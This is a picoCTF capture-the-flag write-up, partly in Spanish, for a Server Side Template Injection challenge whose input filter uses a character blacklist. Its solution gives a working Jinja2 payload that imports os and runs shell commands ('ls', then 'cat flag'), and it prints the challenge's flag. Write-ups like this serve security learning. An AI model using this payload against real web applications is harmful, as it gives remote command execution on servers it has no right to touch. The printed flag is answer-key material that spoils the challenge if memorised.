## Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:51040/)!

## Pistas
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?
## Solución 1
1. Usando este payload podemos ver los archivos `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
2. Sustituimos `ls` por `cat flag`
3. Obtenemos la bandera `picoCTF{sst1_f1lt3r_byp4ss_ece726e9}`
## Referencias
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/